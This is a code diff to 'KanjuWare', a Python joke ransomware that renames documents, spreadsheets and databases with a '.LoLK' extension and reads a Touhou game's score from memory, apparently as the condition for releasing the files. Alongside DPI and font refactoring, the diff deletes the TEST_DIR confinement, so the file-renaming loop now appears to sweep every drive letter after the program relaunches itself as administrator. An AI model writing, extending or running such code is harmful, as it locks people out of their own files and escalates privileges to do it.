@@ -7,13 +7,14 @@ import time
 import threading
 import tkinter as tk
 from tkinter import messagebox
+from PIL import Image, ImageDraw, ImageFont
+import io
 from pymem import Pymem
 
 # ==================== Configuration ====================
 TARGET_SCORE = 5000000 # The target score is set to 5 million (5000000) instead of 50 million because the score in memory is actually the displayed score divided by 10. This is a common practice in games to save memory and simplify score handling. So when the player reaches 50 million points, the value stored in memory will be 5 million (5000000). Therefore, we set TARGET_SCORE to 5000000 to correctly detect when the player has reached the required score for unlocking the files.
 SCORE_ADDRESS = 0x004E40BC # This is the memory address where the score is stored in the trial version of Touhou Kanjuden. For the full version, the score is stored at 0x004E740C. The program will automatically detect which version is running and read the score from the correct address.
-TARGET_EXTENSION = ".LoLK"
-TEST_DIR = "./test_files"
+TARGET_EXTENSION = ".LoLK" # This is the extension that will be appended to files to simulate encryption. When the program "encrypts" a file, it will rename the file to have this extension. For example, "document.pdf" would be renamed to "document.pdf.LoLK". This allows for easy recovery by simply removing the ".LoLK" extension from the file name.
 FILE_EXTENSIONS_NEED_TO_RENAME = {
     ".pdf", ".txt", ".md", ".json", ".doc", ".docx", ".odt", ".wps",
     ".ppt", ".pptx", ".xls", ".xlsx", "csv", ".tsv", ".sql", ".db", ".mdb", ".accdb", "odp", "ods",
@@ -45,25 +46,25 @@ def setup_high_dpi():
                 ctypes.windll.user32.SetProcessDPIAware()
             except:
                 pass
+def get_scale_factor():
+    if platform.system() == 'Windows':
+        try:
+            return ctypes.windll.user32.GetDpiForSystem() / 96.0
+        except:
+            hdc = ctypes.windll.user32.GetDC(0)
+            dpi = ctypes.windll.gdi32.GetDeviceCaps(hdc, 88)
+            ctypes.windll.user32.ReleaseDC(0, hdc)
+            return dpi / 96.0
+            # Linux and macOS typically handle DPI scaling automatically, but we can attempt to read GDK_SCALE for Linux
+    try:
+        # Some Linux environments use GDK_SCALE for scaling factor, default to 1.0 if not set
+        return float(os.environ.get('GDK_SCALE', 1.0))
+    except:
+        return 1.0
 # =====================================================
 
 class KanjuWareApp:
     def __init__(self, root):
-        def get_scale_factor():
-            if platform.system() == 'Windows':
-                try:
-                    return ctypes.windll.user32.GetDpiForSystem() / 96.0
-                except:
-                    hdc = ctypes.windll.user32.GetDC(0)
-                    dpi = ctypes.windll.gdi32.GetDeviceCaps(hdc, 88)
-                    ctypes.windll.user32.ReleaseDC(0, hdc)
-                    return dpi / 96.0
-            # Linux and macOS typically handle DPI scaling automatically, but we can attempt to read GDK_SCALE for Linux
-            try:
-                # Some Linux environments use GDK_SCALE for scaling factor, default to 1.0 if not set
-                return float(os.environ.get('GDK_SCALE', 1.0))
-            except:
-                return 1.0
         scale = get_scale_factor()
         self.root = root
         self.root.title("KanjuWare v1.12 - Pure Mutation")
@@ -85,6 +86,7 @@ class KanjuWareApp:
         self.root.after(100, self.update_loop)
 
     def setup_ui(self):
+            scale = get_scale_factor() # Get the current DPI scaling factor to adjust UI element sizes accordingly
             self.root.configure(bg="#1a1a2e")
             
             title_label = tk.Label(
@@ -113,16 +115,16 @@ class KanjuWareApp:
                 self.root, text=instruction_text, 
                 font=("Consolas", 9), 
                 fg="#ffffff", bg="#1a1a2e", justify="left",
-                wraplength=440
+                wraplength=440 * scale
             )
             msg_label.pack(pady=5, padx=30)
             
-            score_frame = tk.Frame(self.root, bg="#16213e", bd=2, relief="groove")
+            score_frame = tk.Frame(self.root, bg="#16213e", bd=2 * scale, relief="groove")
             score_frame.pack(pady=15, fill="x", padx=40)
             
             status_label = tk.Label(
                 score_frame, textvariable=self.status_text, 
-                font=("Microsoft YaHei", 9, "italic"), fg="#eccc68", bg="#16213e"
+                font=("Segoe UI", 9, "italic"), fg="#eccc68", bg="#16213e"
             )
             status_label.pack(pady=3)
             
@@ -156,10 +158,6 @@ class KanjuWareApp:
 
     def infect_files(self):
         self.status_text.set("Pure mutation is being launched (scanning all files...)")
-        
-        if not os.path.exists(TEST_DIR):
-            try: os.makedirs(TEST_DIR)
-            except: pass
             
         count = 0
         for drive_letter in range(ord("A"), ord("Z") + 1):
@@ -280,6 +278,7 @@ def relaunch_as_admin():
 
 # ==================== Entrance ====================
 if __name__ == "__main__":
+    setup_high_dpi()
     if not is_running_as_admin():
         if relaunch_as_admin():
             sys.exit(0)
@@ -290,8 +289,6 @@ if __name__ == "__main__":
                 "Need Administrator Privileges",
                 0x10,
             )
-
-    setup_high_dpi()
     root = tk.Tk()
     root.withdraw()
     start_confirmation = messagebox.askyesno(
